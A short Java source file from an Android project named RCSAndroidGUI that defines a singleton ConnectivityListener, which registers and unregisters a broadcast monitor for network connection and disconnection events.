package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Connectivity;

public class ConnectivityListener extends Listener<Connectivity> {
	/** The Constant TAG. */
	private static final String TAG = "ConnectivityListener";

	private ConnectivityBroadcastMonitor connectivityReceiver;

	/** The singleton. */
	private volatile static ConnectivityListener singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ConnectivityListener self() {
		if (singleton == null) {
			synchronized (ConnectivityListener.class) {
				if (singleton == null) {
					singleton = new ConnectivityListener();
				}
			}
		}

		return singleton;
	}
	
	@Override
	protected void start() {
		registerConnectivity();
	}

	@Override
	protected void stop() {
		connectivityReceiver.unregister();
	}
	
	/**
	 * Register to Network Connection/Disconnection notification.
	 */
	private void registerConnectivity() {
		connectivityReceiver = new ConnectivityBroadcastMonitor();
		connectivityReceiver.start();
		connectivityReceiver.register();
	}
}
